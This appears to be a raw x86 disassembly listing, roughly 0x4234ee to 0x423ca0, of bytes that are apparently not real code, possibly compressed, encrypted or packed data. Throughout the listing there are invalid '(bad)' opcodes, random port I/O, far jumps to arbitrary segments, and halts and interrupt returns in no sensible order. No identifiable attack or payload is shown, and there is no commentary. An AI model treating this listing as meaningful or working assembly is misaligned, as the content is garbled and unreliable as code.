  4234ee:	pop    ebx
  4234ef:	push   cs
  4234f0:	mov    eax,0x7dacf9b0
  4234f5:	jge    0x423520
  4234f7:	mov    eax,ds:0x4f62c80d
  4234fc:	fild   QWORD PTR [edx]
  4234fe:	xlat   BYTE PTR ds:[ebx]
  4234ff:	fdivp  st(3),st
  423501:	jg     0x4234b6
  423503:	cld    
  423504:	xchg   ebx,eax
  423505:	jg     0x4234a0
  423507:	int    0x8b
  423509:	push   edi
  42350a:	cmp    BYTE PTR [ebp-0x19],dh
  42350d:	cmp    DWORD PTR [esi-0x52],ecx
  423510:	das    
  423511:	mov    al,0xb9
  423513:	fnstsw WORD PTR [edx+0x33]
  423516:	iret   
  423517:	pop    esp
  423518:	jp     0x4234b4
  42351a:	fsub   st(1),st
  42351c:	push   esi
  42351d:	cli    
  42351e:	ror    DWORD PTR ss:[ebx+ebp*1-0x58],1
  423523:	call   0xfa88:0x1d6bcb5c
  42352a:	in     al,0x16
  42352c:	xor    eax,0x3d435342
  423531:	test   DWORD PTR [edx+0x48],ecx
  423534:	add    cl,bl
  423536:	dec    ebx
  423537:	xor    eax,0xcd9a7375
  42353c:	or     ecx,DWORD PTR [ecx-0x501606a1]
  423542:	and    eax,0x72b0aded
  423547:	repnz lea ecx,[esi]
  42354a:	jmp    0x423561
  42354c:	or     eax,0x81aa5d30
  423551:	shr    dh,0xf6
  423554:	ds sti 
  423556:	xlat   BYTE PTR ds:[ebx]
  423557:	jbe    0x4235d2
  423559:	ret    
  42355a:	jge    0x423571
  42355c:	sub    ecx,ebp
  42355e:	adc    bl,BYTE PTR [edi+0x753ec2f8]
  423564:	push   ebx
  423565:	add    ebx,DWORD PTR [esi-0x1b]
  423568:	call   0x9c798f1
  42356d:	or     BYTE PTR [eax-0x33e5ff07],0x9c
  423574:	xchg   ebp,eax
  423575:	and    DWORD PTR [esp+eax*8],ebp
  423578:	scas   eax,DWORD PTR es:[edi]
  423579:	mov    ds:0xb2d56726,eax
  42357e:	dec    esi
  42357f:	push   eax
  423580:	and    BYTE PTR [edi],dl
  423582:	rcl    BYTE PTR [eax],1
  423584:	cld    
  423585:	sbb    DWORD PTR [ebp-0x4861f7c5],ebx
  42358b:	scas   eax,DWORD PTR es:[edi]
  42358c:	sbb    edi,esi
  42358e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42358f:	sub    esi,0xae5c392a
  423595:	iret   
  423596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423598:	fcmovnu st,st(1)
  42359a:	aad    0x35
  42359c:	mov    ds:0x2a42ab04,eax
  4235a1:	add    BYTE PTR cs:[ecx],cl
  4235a4:	out    dx,eax
  4235a5:	cmp    ah,ah
  4235a7:	out    dx,eax
  4235a8:	cs push cs
  4235aa:	es ss mov ebx,0x6b5b211c
  4235b1:	xchg   BYTE PTR [eax+0x4b8591c0],ch
  4235b7:	pop    ebp
  4235b8:	dec    esi
  4235b9:	xor    ebx,DWORD PTR [edx+0x28]
  4235bc:	or     BYTE PTR [esi],ah
  4235be:	push   ecx
  4235bf:	cld    
  4235c0:	jmp    0x23ca:0xfd3bc52
  4235c7:	mov    ecx,0xf579c9e2
  4235cc:	add    eax,0xe296e4b5
  4235d1:	stos   BYTE PTR es:[edi],al
  4235d2:	test   DWORD PTR [ebx-0x30],ebx
  4235d5:	in     al,dx
  4235d6:	ficom  WORD PTR [eax+0x6d0f6bbf]
  4235dc:	scas   al,BYTE PTR es:[edi]
  4235dd:	or     DWORD PTR [ecx+0x53],ebx
  4235e0:	stc    
  4235e1:	dec    ebp
  4235e2:	sub    ch,cl
  4235e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235e6:	call   0x9d81:0x2a5d912a
  4235ed:	pop    esi
  4235ee:	pop    ecx
  4235ef:	(bad)  
  4235f0:	cmp    BYTE PTR [esp+ebx*4],ch
  4235f3:	xchg   edx,eax
  4235f4:	in     al,dx
  4235f5:	add    DWORD PTR [edi+0x35],esp
  4235f8:	hlt    
  4235f9:	lods   eax,DWORD PTR ds:[esi]
  4235fa:	sub    edi,esp
  4235fc:	mov    al,ds:0x37a51130
  423601:	out    0x1e,eax
  423603:	dec    ebp
  423604:	mov    DWORD PTR [ecx],ecx
  423606:	adc    BYTE PTR [edi+0x1f],0xe6
  42360a:	sahf   
  42360b:	push   cs
  42360c:	mov    dh,0x7e
  42360e:	sub    BYTE PTR [edi],0xcb
  423611:	xchg   BYTE PTR [edx-0x2ed3e845],bh
  423617:	dec    ebx
  423618:	in     al,dx
  423619:	popf   
  42361a:	(bad)  
  42361b:	dec    esi
  42361c:	dec    esi
  42361d:	push   es
  42361e:	jb     0x4235a7
  423620:	and    DWORD PTR [eax+0x27],esi
  423623:	rcr    DWORD PTR [esi-0x6efec99f],0x83
  42362a:	fistp  WORD PTR [edi+0x52]
  42362d:	jg     0x42361e
  42362f:	in     eax,dx
  423630:	test   DWORD PTR [ebx-0x2db0ea80],edx
  423636:	stos   BYTE PTR es:[edi],al
  423637:	stos   BYTE PTR es:[edi],al
  423638:	mov    edx,0x5cd351bd
  42363d:	inc    esi
  42363e:	push   es
  42363f:	out    0x6e,al
  423641:	cmp    bh,al
  423643:	ins    BYTE PTR es:[edi],dx
  423644:	jp     0x423664
  423646:	rcl    DWORD PTR [edi-0x7d401894],0x64
  42364d:	inc    esp
  42364e:	test   ebx,eax
  423650:	adc    DWORD PTR [esi-0x3a652a6b],0xffffffa5
  423657:	add    eax,0x8dc6dc24
  42365c:	das    
  42365d:	inc    esp
  42365e:	out    dx,al
  42365f:	scas   al,BYTE PTR es:[edi]
  423660:	(bad)  
  423661:	sbb    BYTE PTR [ecx+edi*8-0x138ac7e9],bh
  423668:	sbb    BYTE PTR [edi],dl
  42366a:	ja     0x42369b
  42366c:	jae    0x4236d3
  42366e:	push   DWORD PTR [edx]
  423670:	dec    esp
  423671:	add    al,0x95
  423673:	enter  0xfbb3,0x17
  423677:	js     0x423654
  423679:	mov    bh,0x7f
  42367b:	test   ah,dh
  42367d:	xor    ebp,edi
  42367f:	loop   0x42366b
  423681:	xchg   edi,eax
  423682:	das    
  423683:	jae    0x423673
  423685:	gs out 0x39,eax
  423688:	mov    ch,0xbe
  42368a:	enter  0xcdd5,0x19
  42368e:	xor    edi,edx
  423690:	ins    BYTE PTR es:[edi],dx
  423691:	(bad)  
  423692:	retf   0xc56f
  423695:	inc    edx
  423696:	ins    BYTE PTR es:[edi],dx
  423697:	repz sbb DWORD PTR [esi+0xb7c9cc8],ebp
  42369e:	ror    DWORD PTR [ecx-0x61],1
  4236a1:	inc    eax
  4236a2:	push   edx
  4236a3:	loope  0x423715
  4236a5:	mov    edi,0x101e4873
  4236aa:	adc    DWORD PTR [edx-0x538ec6b2],edi
  4236b0:	loop   0x423686
  4236b2:	in     eax,dx
  4236b3:	addr16 push ecx
  4236b5:	outs   dx,BYTE PTR ds:[esi]
  4236b6:	inc    ebx
  4236b7:	mov    es,WORD PTR [ecx-0x23]
  4236ba:	pop    eax
  4236bb:	inc    ebx
  4236bc:	push   ecx
  4236bd:	add    DWORD PTR [edi-0x4119ad0e],ebp
  4236c3:	aam    0x18
  4236c5:	repnz add al,0x57
  4236c8:	dec    edi
  4236c9:	jge    0x423655
  4236cb:	sub    eax,edi
  4236cd:	mov    dh,0x68
  4236cf:	push   ds
  4236d0:	(bad)  
  4236d1:	jae    0x423663
  4236d3:	dec    esi
  4236d4:	fdivr  st,st(1)
  4236d6:	mov    ds:0xdc06e495,al
  4236db:	ret    0x43fb
  4236de:	imul   ecx,ecx,0x21
  4236e1:	(bad)  
  4236e2:	xor    al,BYTE PTR [ecx+ebx*8-0x19e9dc80]
  4236e9:	or     edx,ecx
  4236eb:	push   cs
  4236ec:	sbb    esp,esi
  4236ee:	stos   DWORD PTR es:[edi],eax
  4236ef:	mov    ds:0x9f4c729e,al
  4236f4:	daa    
  4236f5:	xchg   ecx,eax
  4236f6:	dec    ebx
  4236f7:	stos   BYTE PTR es:[edi],al
  4236f8:	push   es
  4236f9:	adc    dl,BYTE PTR [esi]
  4236fb:	mov    bh,0xb7
  4236fd:	push   edi
  4236fe:	mov    sp,0x7048
  423702:	add    eax,0x8180b993
  423707:	pushf  
  423708:	push   esp
  423709:	iret   
  42370a:	adc    eax,esi
  42370c:	jp     0x42378d
  42370e:	inc    edi
  42370f:	dec    ecx
  423710:	cdq    
  423711:	fst    st(7)
  423713:	push   0xefe44b09
  423718:	add    si,0x84dd
  42371d:	cwde   
  42371e:	rcl    DWORD PTR [esi+0x4e7ff894],0x3c
  423725:	dec    edx
  423726:	add    eax,0x4a0ffe
  42372b:	mov    bh,0xee
  42372d:	sbb    DWORD PTR [ebp+0x24],ebp
  423730:	pop    ss
  423731:	enter  0xcc92,0x93
  423735:	xor    edx,DWORD PTR [edi]
  423737:	xchg   ebp,eax
  423738:	mov    dl,0xe0
  42373a:	dec    ecx
  42373b:	push   cs
  42373c:	jmp    0x423723
  42373e:	sub    al,0xc3
  423740:	popa   
  423741:	fnstcw WORD PTR [eax+0x6]
  423744:	in     eax,0x55
  423746:	adc    BYTE PTR [ecx-0x5cdfa1ea],cl
  42374c:	rol    BYTE PTR [edx-0x781a74c2],0xae
  423753:	mov    bl,0x67
  423755:	dec    edx
  423756:	xor    DWORD PTR [ecx],edx
  423758:	lahf   
  423759:	mov    edx,0xbe5ebb9b
  42375e:	ret    
  42375f:	push   ebx
  423760:	fisttp DWORD PTR [edi+0x5bd5eb33]
  423766:	js     0x4237a9
  423768:	pop    edi
  423769:	sub    DWORD PTR [ecx+0x29d16eb6],ebp
  42376f:	jne    0x423747
  423771:	or     al,0x55
  423773:	lods   al,BYTE PTR ds:[esi]
  423774:	mov    edx,DWORD PTR [ebx-0x1b]
  423777:	retf   0x1529
  42377a:	jle    0x42371d
  42377c:	pop    esp
  42377d:	sbb    BYTE PTR [esi+0x2e81444],0x9e
  423784:	rcl    DWORD PTR [edi+0x4c97b695],1
  42378a:	pop    es
  42378b:	inc    ecx
  42378c:	cmp    ch,BYTE PTR [ebx]
  42378e:	out    0xe,eax
  423790:	cdq    
  423791:	(bad)  
  423792:	shl    DWORD PTR [esi+ecx*8-0x7e],1
  423796:	inc    bp
  423798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423799:	shl    BYTE PTR ds:0x7eb64a84,1
  42379f:	jg     0x423782
  4237a1:	stc    
  4237a2:	mov    ebp,0xa617b7
  4237a7:	jle    0x423799
  4237a9:	pop    es
  4237aa:	adc    DWORD PTR [ecx+0x5e37c89f],ebp
  4237b0:	adc    ch,BYTE PTR [edx]
  4237b2:	jb     0x423746
  4237b4:	dec    ebx
  4237b5:	sub    DWORD PTR [edi+esi*8+0x362aff27],eax
  4237bc:	fwait
  4237bd:	bound  esi,QWORD PTR [ebx]
  4237bf:	pusha  
  4237c0:	shr    DWORD PTR ds:0x50c47a93,1
  4237c6:	cdq    
  4237c7:	pop    ds
  4237c8:	jbe    0x423752
  4237ca:	add    al,0xa6
  4237cc:	dec    ebx
  4237cd:	adc    edx,esi
  4237cf:	mov    edx,0x783cd93b
  4237d4:	call   0x1bd9:0xe4af4bf3
  4237db:	(bad)  
  4237dc:	jo     0x4237a5
  4237de:	mov    DWORD PTR [ebx],esi
  4237e0:	ror    BYTE PTR [ebx],1
  4237e2:	push   edi
  4237e3:	outs   dx,DWORD PTR ds:[esi]
  4237e4:	pop    esp
  4237e5:	inc    ebx
  4237e6:	xchg   edi,eax
  4237e7:	adc    al,0x99
  4237e9:	and    al,0x3e
  4237eb:	cmp    edi,ebp
  4237ed:	and    al,0xdf
  4237ef:	icebp  
  4237f0:	pop    ss
  4237f1:	out    dx,al
  4237f2:	loopne 0x423857
  4237f4:	push   eax
  4237f6:	push   ebp
  4237f7:	ins    BYTE PTR es:[edi],dx
  4237f8:	cmp    al,0x73
  4237fa:	cdq    
  4237fb:	repz das 
  4237fd:	mov    edi,0xa8ad60dd
  423802:	mov    ch,0x3
  423804:	push   ebx
  423805:	pop    edi
  423806:	dec    esi
  423807:	retf   
  423808:	pop    ebp
  423809:	stos   DWORD PTR es:[edi],eax
  42380a:	loopne 0x42383c
  42380c:	mov    ecx,edx
  42380e:	out    dx,al
  42380f:	cmp    DWORD PTR [edi],edx
  423811:	mov    esi,0xb7618758
  423816:	push   ss
  423817:	bound  edx,QWORD PTR [esi]
  423819:	add    eax,0x6cae6e81
  42381e:	stos   DWORD PTR es:[edi],eax
  42381f:	das    
  423820:	sbb    eax,0xceb1098e
  423825:	jp     0x423816
  423827:	xlat   BYTE PTR ds:[ebx]
  423828:	aaa    
  423829:	push   eax
  42382a:	mov    ah,0x4b
  42382c:	dec    ebx
  42382d:	xchg   esi,eax
  42382e:	rcl    BYTE PTR [ecx-0x1e8cb1f2],1
  423834:	push   edi
  423835:	dec    BYTE PTR [eax]
  423837:	test   BYTE PTR [edx],bl
  423839:	inc    ebp
  42383a:	cmp    BYTE PTR [esi-0x36a7ba94],dl
  423840:	ds sub eax,0x78a9ca4e
  423846:	jmp    0x4237f9
  423848:	xor    al,0x78
  42384a:	push   esi
  42384b:	sbb    DWORD PTR ds:[eax+ecx*2-0x4d],ebp
  423850:	inc    edx
  423851:	nop
  423852:	shl    BYTE PTR [edx+0x6c],cl
  423855:	loopne 0x423848
  423857:	sub    eax,0x6fbd4881
  42385c:	cmp    BYTE PTR [eax+0x36443569],0x90
  423863:	ja     0x4238ab
  423865:	push   ss
  423866:	add    ah,BYTE PTR [edx+eax*1+0x74118bff]
  42386d:	xchg   esp,eax
  42386e:	sub    al,0x7e
  423870:	pop    esp
  423871:	sub    DWORD PTR [ebx-0x32],ebx
  423874:	outs   dx,BYTE PTR ds:[esi]
  423875:	inc    ecx
  423876:	push   edx
  423877:	(bad)  
  423878:	cmp    ah,BYTE PTR [ecx+edx*2-0x10ae7298]
  42387f:	shr    DWORD PTR [ebp+edx*8+0x73],0xfc
  423884:	jle    0x4238e6
  423886:	call   FWORD PTR ds:0x232496cc
  42388c:	sub    eax,0xd1f0628a
  423891:	in     eax,dx
  423892:	(bad)  
  423893:	je     0x423885
  423895:	in     eax,dx
  423896:	mov    bl,0x80
  423898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423899:	in     al,dx
  42389a:	idiv   ebx
  42389c:	js     0x42382b
  42389e:	stc    
  42389f:	add    BYTE PTR ds:0x58a2845c,bl
  4238a5:	inc    esi
  4238a6:	ds jg  0x4238d2
  4238a9:	inc    esi
  4238aa:	jb     0x42384d
  4238ac:	sub    al,0xbf
  4238ae:	retf   
  4238af:	or     al,0xd5
  4238b1:	inc    ecx
  4238b2:	push   edx
  4238b3:	jge    0x4238e1
  4238b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238b6:	int    0x2
  4238b8:	pop    edi
  4238b9:	cld    
  4238ba:	mov    ecx,0x3be1be45
  4238bf:	mov    edi,0x4bf5c596
  4238c4:	ins    BYTE PTR es:[edi],dx
  4238c5:	jne    0x4238fe
  4238c7:	sub    al,0xe7
  4238c9:	pop    ds
  4238ca:	jmp    0x4238d8
  4238cc:	push   ebp
  4238cd:	aad    0x95
  4238cf:	gs in  al,dx
  4238d1:	lds    eax,FWORD PTR [edx+eiz*4-0x5d]
  4238d5:	jb     0x4238cd
  4238d7:	cs xchg ax,ax
  4238da:	les    esp,FWORD PTR [edx]
  4238dc:	xor    edx,edx
  4238de:	or     eax,0x75628da7
  4238e3:	arpl   WORD PTR [ebp+0x2ef4ce68],bx
  4238e9:	jl     0x42392f
  4238eb:	push   cs
  4238ec:	scas   eax,DWORD PTR es:[edi]
  4238ed:	fidiv  WORD PTR [ebp-0x6]
  4238f0:	jbe    0x4238c0
  4238f2:	das    
  4238f3:	popf   
  4238f4:	out    0xd1,eax
  4238f6:	lea    esp,[edi]
  4238f8:	cdq    
  4238f9:	pop    ds
  4238fa:	fcmove st,st(3)
  4238fc:	lahf   
  4238fd:	push   esi
  4238fe:	or     eax,0x2f731daa
  423903:	clc    
  423904:	cmp    dh,BYTE PTR [ebp+0x7cf9867a]
  42390a:	inc    edx
  42390b:	push   ebp
  42390c:	push   edi
  42390d:	pop    ss
  42390e:	mov    esi,0x9e7ae12a
  423913:	in     eax,dx
  423914:	add    eax,0xbdf78029
  423919:	out    dx,eax
  42391a:	jge    0x423916
  42391c:	jecxz  0x42391d
  42391e:	repnz mov edi,0x9ae6e27b
  423924:	push   0xffffffeb
  423926:	(bad)  [edi]
  423928:	mov    al,ds:0x1c357c00
  42392d:	sbb    edx,ebx
  42392f:	mov    ds:0x182ca028,eax
  423934:	push   edx
  423935:	jbe    0x4238c2
  423937:	call   FWORD PTR [edi+0x50]
  42393a:	pop    ebp
  42393b:	mov    eax,0x81b5cfc9
  423940:	jmp    0x4228:0xf79848ba
  423947:	pop    ebp
  423948:	pop    es
  423949:	neg    BYTE PTR [esi]
  42394b:	ins    BYTE PTR es:[edi],dx
  42394c:	js     0x42394a
  42394e:	mov    cl,0xbb
  423950:	test   eax,0x99e5af66
  423955:	cmc    
  423956:	jmp    0x423934
  423958:	stc    
  423959:	jmp    0xd801:0xf73d5ce3
  423960:	push   ebx
  423961:	ret    0x407a
  423964:	inc    ebp
  423965:	dec    ecx
  423966:	out    0x6e,eax
  423968:	jo     0x423953
  42396a:	jmp    0xc8fb:0xe67739fb
  423971:	sbb    DWORD PTR [edi+0x1],esp
  423974:	mov    bl,0x28
  423976:	inc    ecx
  423977:	mov    al,ds:0x591a68a
  42397c:	out    dx,eax
  42397d:	fistp  DWORD PTR [esi]
  42397f:	cmp    al,0x57
  423981:	enter  0x6c17,0x50
  423985:	fadd   QWORD PTR [edx-0x5]
  423988:	in     al,0xd7
  42398a:	retf   0x5940
  42398d:	xchg   dl,ah
  42398f:	repz jns 0x423961
  423992:	xchg   ecx,eax
  423993:	adc    eax,0x841f8b92
  423998:	mov    bl,0xfc
  42399a:	and    BYTE PTR [ecx],dh
  42399c:	shl    DWORD PTR [ecx*1-0x4f111815],1
  4239a3:	daa    
  4239a4:	cmc    
  4239a5:	jle    0x42392c
  4239a7:	sbb    ch,BYTE PTR [edx]
  4239a9:	dec    edi
  4239aa:	popf   
  4239ab:	jne    0x42397c
  4239ad:	das    
  4239ae:	fsub   DWORD PTR [esi+ecx*1-0x19a8c05b]
  4239b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239b6:	sbb    DWORD PTR [eax-0x60],esp
  4239b9:	pop    edi
  4239ba:	and    ah,BYTE PTR [ecx]
  4239bc:	mov    dh,0x1c
  4239be:	mov    bh,0x4f
  4239c0:	pop    edi
  4239c1:	mov    edi,DWORD PTR [esi+0x24819f1a]
  4239c7:	retf   0x9ca2
  4239ca:	cmp    DWORD PTR [edx+0x3b16f851],edi
  4239d0:	mov    al,ds:0x4f9102be
  4239d6:	inc    esp
  4239d7:	sub    DWORD PTR [edi-0x63fe0a0e],esp
  4239dd:	xor    BYTE PTR ds:0x86d0da96,ch
  4239e3:	mov    edx,0x2aefb402
  4239e8:	mov    ecx,0x556021eb
  4239ed:	and    ebp,0xffffff96
  4239f0:	les    edi,FWORD PTR [ebx]
  4239f2:	dec    DWORD PTR [eax]
  4239f4:	mov    ecx,0xb6266913
  4239f9:	lea    edi,[edi-0x38]
  4239fc:	pop    ss
  4239fd:	data16 and ah,0x68
  423a01:	mov    eax,ds:0x75465007
  423a06:	adc    ebp,edx
  423a08:	sbb    al,0x0
  423a0a:	push   esi
  423a0b:	inc    eax
  423a0c:	(bad)  
  423a0d:	sti    
  423a0e:	dec    ecx
  423a0f:	je     0x423995
  423a11:	or     cl,BYTE PTR [edx-0x7]
  423a14:	jno    0x423a5c
  423a16:	add    eax,0xbf022137
  423a1b:	mov    cs,edx
  423a1d:	loopne 0x4239ed
  423a1f:	or     al,0xc6
  423a21:	imul   ebp,DWORD PTR [esp+edi*8],0x236fbbf6
  423a28:	dec    ebx
  423a29:	dec    ebx
  423a2a:	or     esi,DWORD PTR [eax-0x1d]
  423a2d:	push   cs
  423a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a2f:	ins    DWORD PTR es:[edi],dx
  423a30:	add    al,0x6a
  423a32:	inc    edx
  423a33:	or     cl,ah
  423a35:	bound  eax,QWORD PTR [edi+0x48]
  423a38:	inc    edx
  423a39:	xchg   esp,eax
  423a3a:	ficom  WORD PTR [esi-0x5]
  423a3d:	lods   eax,DWORD PTR ds:[esi]
  423a3e:	add    dl,BYTE PTR [ebp-0x80]
  423a41:	mov    edx,0xaf82f40e
  423a46:	add    BYTE PTR [ebp+0xc957b9],cl
  423a4c:	jnp    0x423a96
  423a4e:	out    0xe,al
  423a50:	mov    dh,0x29
  423a52:	xor    al,bh
  423a54:	test   DWORD PTR [edi+0x25f8a6ec],ebx
  423a5a:	add    ebx,esp
  423a5c:	jge    0x423a54
  423a5e:	cmp    al,0x55
  423a60:	or     ah,bh
  423a62:	into   
  423a63:	out    0xe3,al
  423a65:	fdiv   QWORD PTR [edi-0x25]
  423a68:	imul   edi,DWORD PTR [ecx+0x6c],0xffffffe3
  423a6c:	add    dh,BYTE PTR [edi+0x15e59e2d]
  423a72:	jmp    0x423aa3
  423a74:	jecxz  0x4239f7
  423a76:	stos   DWORD PTR es:[edi],eax
  423a77:	psrld  mm5,mm6
  423a7a:	push   ds
  423a7b:	fmul   DWORD PTR [edx-0x33]
  423a7e:	fiadd  DWORD PTR [edx-0x25]
  423a81:	shl    BYTE PTR [edx+0x78],0xe4
  423a85:	ja     0x423a9c
  423a87:	shr    BYTE PTR [edi+0xa417b70],cl
  423a8d:	inc    eax
  423a8e:	cmp    bl,0x96
  423a91:	ret    0xfb93
  423a94:	pop    es
  423a95:	sbb    DWORD PTR ss:[edi+esi*8],esi
  423a99:	ins    DWORD PTR es:[edi],dx
  423a9a:	or     eax,DWORD PTR [edx+0x70]
  423a9d:	js     0x423acb
  423a9f:	dec    esi
  423aa0:	pop    eax
  423aa1:	in     al,0x2f
  423aa3:	fsub   st(4),st
  423aa5:	add    al,0x3c
  423aa7:	lahf   
  423aa8:	push   edi
  423aa9:	jo     0x423a9e
  423aab:	addr16 iret 
  423aad:	ja     0x423afb
  423aaf:	cmp    ebp,ebx
  423ab1:	push   0x859335a6
  423ab6:	xchg   BYTE PTR [ebx],dh
  423ab8:	rcl    DWORD PTR [edi+0x4ba02121],cl
  423abe:	sbb    dh,0x46
  423ac1:	call   0x45bccc75
  423ac6:	push   0xffffffd0
  423ac8:	cmp    eax,0x6599d8e1
  423acd:	scas   al,BYTE PTR es:[edi]
  423ace:	out    dx,eax
  423acf:	outs   dx,DWORD PTR ds:[esi]
  423ad0:	jae    0x423acd
  423ad2:	jmp    0x3bd:0x17c4305f
  423ad9:	mov    ?,WORD PTR [eax+0x38d49c5f]
  423adf:	xchg   esi,eax
  423ae0:	rcl    bl,cl
  423ae2:	adc    eax,0xf7821be3
  423ae7:	pop    ebx
  423ae8:	lock fadd QWORD PTR [esi]
  423aeb:	retf   
  423aec:	fnstenv [esi]
  423aee:	push   esp
  423aef:	and    edi,DWORD PTR [ebp-0x3386aa6a]
  423af5:	jb     0x423ac1
  423af7:	add    bh,dh
  423af9:	sub    eax,DWORD PTR [ebx-0x7238f96a]
  423aff:	mov    esp,0x2e6e8111
  423b04:	hlt    
  423b05:	pop    ecx
  423b06:	sub    DWORD PTR [edx-0x2fd5b67e],edi
  423b0c:	cdq    
  423b0d:	xor    dl,BYTE PTR [ebx+0x4f]
  423b10:	push   edi
  423b11:	into   
  423b12:	jle    0x423b7e
  423b14:	aam    0x50
  423b16:	dec    eax
  423b17:	test   eax,0x21cc7eb1
  423b1c:	aas    
  423b1d:	stos   DWORD PTR es:[edi],eax
  423b1e:	test   BYTE PTR [edi+eax*1-0x5],dl
  423b22:	mov    ds,WORD PTR [eax]
  423b24:	jl     0x423b38
  423b26:	mov    esp,DWORD PTR [edi-0x11]
  423b29:	adc    eax,0x32dc94e4
  423b2e:	mov    ebx,0x95ea8bc2
  423b33:	data16 or bh,BYTE PTR [ecx]
  423b36:	cmp    ebx,DWORD PTR [eax+0x60]
  423b39:	push   eax
  423b3a:	push   es
  423b3b:	bound  edi,QWORD PTR [ebx+ecx*2-0x6a]
  423b3f:	pop    es
  423b40:	mov    ecx,0xd1c3d499
  423b45:	pop    esi
  423b46:	(bad)  
  423b47:	sub    BYTE PTR [esi+0x1059200b],bl
  423b4d:	jno    0x423add
  423b4f:	add    eax,0x90a4b923
  423b54:	outs   dx,BYTE PTR ds:[esi]
  423b55:	and    ebp,DWORD PTR [ebx]
  423b57:	out    dx,eax
  423b58:	mov    BYTE PTR [esi-0x38],ch
  423b5b:	retf   0x96cb
  423b5e:	jo     0x423b10
  423b60:	into   
  423b61:	xor    DWORD PTR [ebx],ecx
  423b63:	je     0x423b2f
  423b65:	jo     0x423b86
  423b67:	jecxz  0x423b9c
  423b69:	mov    esp,0x8c84ca68
  423b6e:	inc    edx
  423b6f:	adc    dl,BYTE PTR [esi+0x50149e3c]
  423b75:	push   edx
  423b76:	inc    ecx
  423b77:	or     ebx,DWORD PTR [edx+0x8]
  423b7a:	int3   
  423b7b:	add    DWORD PTR [edi+0x18],0x10a1b3a3
  423b82:	inc    edx
  423b83:	(bad)  
  423b84:	pop    esp
  423b85:	jg     0x423bfd
  423b87:	shl    BYTE PTR [edx-0x7f269b50],1
  423b8d:	mov    ebx,0xe2bc4bd3
  423b92:	in     al,0xbd
  423b94:	hlt    
  423b95:	sub    edi,ebx
  423b97:	jl     0x423b93
  423b99:	fnstcw WORD PTR [edi+0x47]
  423b9c:	stos   DWORD PTR es:[edi],eax
  423b9d:	sbb    eax,0x4b7d02da
  423ba2:	call   0x5db2:0xc6b16a04
  423ba9:	dec    edx
  423baa:	(bad)  
  423bac:	fcmovnbe st,st(2)
  423bae:	add    DWORD PTR [ebx],0x6d578258
  423bb4:	jecxz  0x423bd0
  423bb6:	and    esi,esi
  423bb8:	mov    ebp,0x2b84985c
  423bbd:	rol    BYTE PTR [ebx+ebp*8],1
  423bc0:	stos   DWORD PTR es:[edi],eax
  423bc1:	imul   ebp,DWORD PTR [ebp*2+0x7f97cdde],0xfffffff6
  423bc9:	or     al,0xd5
  423bcb:	(bad)  
  423bcc:	pop    ecx
  423bcd:	mov    esi,0xbc8bd6fc
  423bd2:	icebp  
  423bd3:	cmp    eax,0x44f4b9a7
  423bd8:	in     al,0x93
  423bda:	(bad)  
  423bdb:	pop    esp
  423bdc:	jecxz  0x423bda
  423bde:	fisubr DWORD PTR [ebx+0x69]
  423be1:	xlat   BYTE PTR ds:[ebx]
  423be2:	push   ds
  423be3:	pusha  
  423be4:	inc    esi
  423be6:	push   ss
  423be7:	mov    ch,0xd4
  423be9:	les    edx,FWORD PTR [eax+ebx*8]
  423bec:	mov    ebx,0xbf23e37c
  423bf1:	mov    ebx,0xdb657d14
  423bf6:	or     ebp,ebx
  423bf8:	pop    es
  423bf9:	and    BYTE PTR [edx+0x38],al
  423bfc:	jno    0x423bfc
  423bfe:	dec    edx
  423bff:	cdq    
  423c00:	adc    eax,0x118e0205
  423c05:	inc    eax
  423c06:	jo     0x423c6b
  423c08:	xor    eax,0xf39e5340
  423c0d:	pop    ss
  423c0e:	iret   
  423c0f:	jmp    0x423c32
  423c11:	fcomp  DWORD PTR [eax+edx*1-0x61]
  423c15:	push   0xfd92708c
  423c1a:	out    dx,al
  423c1b:	xchg   cx,ax
  423c1d:	popf   
  423c1e:	lods   eax,DWORD PTR ds:[esi]
  423c1f:	sbb    ebx,edi
  423c21:	mov    ebx,0x72f60e73
  423c26:	stos   DWORD PTR es:[edi],eax
  423c27:	gs loope 0x423bf0
  423c2a:	jl     0x423bcb
  423c2c:	cmc    
  423c2d:	in     eax,0x93
  423c2f:	xchg   esi,eax
  423c30:	sub    DWORD PTR [ebp+0x2d56391d],esi
  423c36:	mov    bl,0xb7
  423c38:	shl    DWORD PTR [ebx+0x7e7f3949],1
  423c3e:	popf   
  423c3f:	test   DWORD PTR [eax+ecx*8-0x14e07cf2],ebx
  423c46:	jne    0x423c40
  423c48:	xor    DWORD PTR [ecx-0x6b],esp
  423c4b:	jl     0x423cb2
  423c4d:	rcr    BYTE PTR [ecx+0xd],cl
  423c50:	jns    0x423ca0
  423c52:	sbb    DWORD PTR [ebx-0x79],edx
  423c55:	mov    esi,0x74632d92
  423c5a:	cmp    sp,bp
  423c5d:	push   cs
  423c5e:	aas    
  423c5f:	mov    eax,edx
  423c61:	jns    0x423c39
  423c63:	call   0xbedb:0x8a15e4ff
  423c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c6b:	popf   
  423c6c:	cmc    
  423c6d:	int3   
  423c6e:	addr16 sbb eax,0xe1cf61ed
  423c74:	popa   
  423c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c76:	popf   
  423c77:	cmc    
  423c78:	mov    ah,0xf3
  423c7a:	inc    esp
  423c7b:	xlat   BYTE PTR ds:[ebx]
  423c7c:	cmp    DWORD PTR [ebp+ecx*4-0x6a],ebp
  423c80:	mov    edi,0x4e08512f
  423c85:	mov    ah,0x19
  423c87:	fsub   QWORD PTR [esi-0x18]
  423c8a:	mov    dh,0x9b
  423c8c:	mov    ebx,0x748af506
  423c91:	mov    esi,0xc1e7b1e2
  423c96:	pop    ebx
  423c97:	out    0x9e,eax
  423c99:	je     0x423c3f
  423c9b:	loop   0x423cec
  423c9d:	jp     0x423d1e
  423c9f:	into   
  423ca0:	fdivr  QWORD PTR [eax]
